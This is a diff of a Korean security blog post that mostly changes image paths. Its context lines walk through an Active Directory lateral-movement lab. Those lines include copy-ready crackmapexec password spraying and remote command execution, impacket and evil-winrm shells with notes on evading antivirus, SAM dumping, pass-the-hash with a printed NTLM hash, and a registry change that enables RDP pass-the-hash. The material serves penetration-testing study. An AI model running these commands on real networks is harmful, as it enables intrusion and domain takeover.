@@ -25,7 +25,7 @@ tags: [Research]
 
 내부 임직원 PC가 랜섬웨어에 감염되어 공격자가 이미 내부망에 초기 침투가 완료된 상태임을 가정합니다. 내부 임직원 PC들은 모두 WINDOWS 10 사용 중이며, 내부망에서는 Active Directory 환경에서 운영 및 관리되고 있습니다. 또한, 초기 침투 과정에서 일부 크리덴셜을 확보한 상태입니다. 
 
-![image.png](image.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image.png)
 
 ### **2.2 인프라 구성**
 
@@ -44,15 +44,15 @@ nmap -sT --top-ports 3000 192.168.134.0/24
 
 192.168.134.131 (USER1-PC) 스캔 결과
 
-![image.png](image%201.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%201.png)
 
 192.168.134.133 (WIN-DC) 스캔 결과
 
-![image.png](image%202.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%202.png)
 
 192.168.134.138 (TEST-PC) 스캔 결과
 
-![image.png](image%203.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%203.png)
 
 ## 3. Active Directory 환경에서의 후속 공격
 
@@ -68,7 +68,7 @@ Active Directory 환경으로 구성된 내부망에 침투한 공격자는 네�
 
 [CrackMapExec, Software S0488 | MITRE ATT&CK®](https://attack.mitre.org/software/S0488/)
 
-![image.png](image%204.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%204.png)
 
 대역에 존재하는 다수의 호스트에서 SMB가 활성화되어 있다는 점을 이용하여 crackmapexec 도구를 이용해 보다 효율적으로 대역대의 상세 정보를 수집합니다. 
 
@@ -76,7 +76,7 @@ Active Directory 환경으로 구성된 내부망에 침투한 공격자는 네�
 crackmapexec smb 192.168.134.0/24
 ```
 
-![image.png](image%205.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%205.png)
 
 crackmapexec 옵션을 통해 유효한 계정 식별이 가능합니다. 정보 수집 단계에서 유효한 크리덴셜을 확보했다는 가정 하에 로그인 시도를 진행합니다. 
 
@@ -84,7 +84,7 @@ crackmapexec 옵션을 통해 유효한 계정 식별이 가능합니다. 정보
 crackmapexec smb 192.168.134.0/24 -u user1 -p 'Password1!@'
 ```
 
-![image.png](image%206.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%206.png)
 
 로그인 실패 시 [-]가 표시되고, 로그인 성공 시 [+]가 표시됩니다.
 
@@ -100,7 +100,7 @@ crackmapexec -x 옵션을 통해서 원격명령 실행이 가능합니다. 단,
 crackmapexec smb 192.168.134.138 -u user1 -p 'Password1!@' -x whoami
 ```
 
-![image.png](image%207.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%207.png)
 
 1. impacket-psexec
 
@@ -122,23 +122,23 @@ crackmapexec와 다르게 impacket-psexec는 대화형 shell을 받아 사용할
 impacket-psexec 'XEONA11/user1:Password1!@'@192.168.134.138
 ```
 
-![image.png](image%208.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%208.png)
 
 단, impacket-psexec 모듈 사용 시 바로 로컬에 exe 파일을 원격 업로드하게 되는데, 이때 높은 확률로 Windows Defender에서 멀웨어로 탐지합니다. 낮은 버전의 Windows OS 또는 AV 탐지 등 보안 정책이 없는 환경에서만 원격으로 대화형 쉘에 연결할 수 있습니다.
 
-![image.png](image%209.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%209.png)
 
 1. impacket-smbexec
 
 반대로, impacket-smbexec 모듈은 Anti-Virus 상관없이 방화벽 정책으로 SMB를 Allow한다면 정상적으로 원격 명령 수행이 가능합니다. 
 
-![image.png](image%2010.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2010.png)
 
 이벤트 로그를 확인해보면, impacket-psexec와는 다르게 로컬 디스크에 실행파일을 저장 후 실행하지 않습니다. 사용자가 보낸 명령을 표준입출력을 통해 내용을 전달한 뒤 삭제하기 때문에 Windows Anti-Virus에서 탐지되지 않습니다. 
 
 하지만, impacket-smbexec의 경우 대화형 shell 같아보이지만, 사용자의 입력값을 받아야 하는 명령 수행 시 사용에 제한이 있습니다. 명령 실행에 대한 결과를 파일 형태로 저장하여 전달하는 방식이기 때문입니다.
 
-![image.png](image%2011.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2011.png)
 
 |  | Crackmapexec (smb) | impacket-psexec | impacket-smbexec |
 | --- | --- | --- | --- |
@@ -160,7 +160,7 @@ crackmapexec에서도 프로토콜 winrm을 지원합니다.  crackmapexec를 �
 
 하지만, crackmapexec 특성상 대화형 쉘을 사용할 수 없는 것은 마찬가지입니다.
 
-![image.png](image%2012.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2012.png)
 
 winrm을 이용하는 대표적인 침투 테스팅 도구로는 evil-winrm이 있습니다. 메모리에 Powershell 스크립트를 로드하여 동작하기 때문에, Anti-Virus 탐지가 되지 않습니다.
 
@@ -172,11 +172,11 @@ crackmapexec와는 다르게 evil-winrm 을 이용하면 winrm을 통해 대화�
 evil-winrm -i 192.168.134.138 -u user1 -p 'Password1!@' 
 ```
 
-![image.png](image%2013.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2013.png)
 
 WIN-DC Domain Controller에 로컬 관리자 권한이 없는 user1으로 접근 시, 쉘을 얻을 수 없습니다.
 
-![image.png](image%2014.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2014.png)
 
 1. RDP
 
@@ -188,7 +188,7 @@ crackmapexec에서 RDP를 지원하기 때문에, 탈취한 크리덴셜을 이�
 crackmapexec rdp 192.168.134.0/24 -u id_list.txt -p 'Password1!@' 
 ```
 
-![image.png](image%2015.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2015.png)
 
 ### **3-2. 잘못된 권한 설정을 통한 AD Domain Controller 권한 상승 시나리오**
 
@@ -204,7 +204,7 @@ Active Directory 환경에서는 다수의 호스트가 존재하기에 crackmap
 crackmapexec smb 192.168.134.0/24
 ```
 
-![image.png](image%2016.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2016.png)
 
 1. 패스워드 스프레이 공격을 통한 유효한 계정 정보 식별
 
@@ -214,7 +214,7 @@ crackmapexec smb 192.168.134.0/24
 crackmapexec smb 192.168.134.0/24 -u id_list.txt -p "Password1!@"
 ```
 
-![image.png](image%2017.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2017.png)
 
 1. 원격 명령 실행
 
@@ -224,7 +224,7 @@ crackmapexec 옵션 중 -x를 이용하여 원격명령 실행이 가능함을 �
 crackmapexec smb 192.168.134.138 -u user1 -p 'Password1!@' -x whoami
 ```
 
-![image.png](image%207.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%207.png)
 
 1. Domain Admins 그룹 내 사용자 식별
 
@@ -234,7 +234,7 @@ user1 도메인 계정으로 로그인이 가능하며, `net user /domain`을 �
 crackmapexec smb 192.168.134.138 -u user1 -p 'Password1!@' -x "net user /domain"
 ```
 
-![image.png](image%2018.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2018.png)
 
 사용자 그룹 중 유일하게 가장 높은 권한이 있는 “Domain Admins” 그룹에 소속된 사용자를 식별합니다. Domain Admins 그룹의 특징은 도메인 서버의 관리자 권한을 가지고 있습니다. MS 공식 자료에 따르면, Domain Admins 그룹에 소속한 사용자는 기본적으로 모든 구성원 서버 및 해당 도메인에 로컬 관리자 그룹의 구성원이 됩니다.  
 
@@ -244,11 +244,11 @@ crackmapexec smb 192.168.134.138 -u user1 -p 'Password1!@' -x "net user /domain"
 crackmapexec smb 192.168.134.138 -u user1 -p 'Password1!@' -x 'net group /domain "Domain Admins"'
 ```
 
-![image.png](image%2019.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2019.png)
 
 실제로 USER1-PC에서 로컬 관리자 그룹 조회 시  Domain Admins 그룹도 포함되어 있음을 알 수 있습니다. testerA는 Domain Admins 그룹 유저이기 때문에 USER1-PC 뿐만 아니라 WIN-DC Domain Controller에 대해서도 로컬 관리자 로그인도 가능합니다. Domain Admins 그룹은 도메인에 가입되어 있는 모든 호스트의 Administrator 그룹에 소속되어 있기 때문에,  해당 그룹 소속 계정에 대한 관리가 중요합니다.
 
-![image.png](image%2020.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2020.png)
 
 1. Pass-the-Hash를 통한 Domain Controller Administrator 권한 탈취
 
@@ -258,7 +258,7 @@ crackmapexec smb 192.168.134.138 -u user1 -p 'Password1!@' -x 'net group /domain
 crackmapexec smb 192.168.134.133 -u testerA -p 'raon12!@' --sam
 ```
 
-![image.png](image%2021.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2021.png)
 
 WIN-DC Administrator의 평문 패스워드를 모르더라도 SAM 통해 탈취한 NTLM 해시로  권한 상승이 가능합니다. NTLM 해시를 hashcat과 같은 도구를 통해 크랙해도 되지만, Pass-the-Hash로 Domain Controller 권한의 shell을 획득할 수 있습니다. 이는 Domain Controller 그룹 내 계정 관리 소홀로 인해 AD Administrator 권한 상승까지 이어질 수 있음을 보여줍니다.
 
@@ -266,7 +266,7 @@ WIN-DC Administrator의 평문 패스워드를 모르더라도 SAM 통해 탈취
 crackmapexec smb 192.168.134.133 -u Administrator -H '0df422499b942b1c7d37fe44191daa2f' -x whoami
 ```
 
-![image.png](image%2022.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2022.png)
 
 1. 원활한 내부 정찰을 위한 Domain Controller Administrator RDP 연결
 
@@ -276,11 +276,11 @@ crackmapexec smb 192.168.134.133 -u Administrator -H '0df422499b942b1c7d37fe4419
 crackmapexec smb 192.168.134.133 -u Administrator -H "NT_HASH" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
 ```
 
-![image.png](image%2023.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2023.png)
 
 `HKLM\System\CurrentControlSet\Control\Lsa` 해당 레지스트리는 윈도우 자격 증명에 관한 키 값을 가지고 있는데, 기본적으로 LSA 프로세스를 보호하기 위해 설정되어 있습니다. 여기에 임의로 원격 관리가 가능하도록 키 값을 추가하면 칼리 리눅스(공격자 PC)에서 윈도우로 원격 데스크톱 연결이 가능합니다.
 
-![image.png](image%2024.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2024.png)
 
 아래 그림처럼, 칼리 내장 도구인 xfreerdp를 이용해 Domain Controller 평문 패스워드없이 WIN-DC의 원격 데스트톱 연결이 가능한 것을 확인할 수 있습니다. 공격자 입장에서 RDP 연결을 통해 가장 효율적이고 편리하게 시스템 제어가 가능합니다.
 
@@ -288,7 +288,7 @@ crackmapexec smb 192.168.134.133 -u Administrator -H "NT_HASH" -x 'reg add HKLM\
 xfreerdp /v:192.168.134.133 /u:administrator /pth:0df422499b942b1c7d37fe44191daa2f /tls-seclevel:0
 ```
 
-![image.png](image%2025.png)
+![/assets/2025-01-02-xeona/image.png](/assets/2025-01-02-xeona/image%2025.png)
 
 ## 4. 결론
 
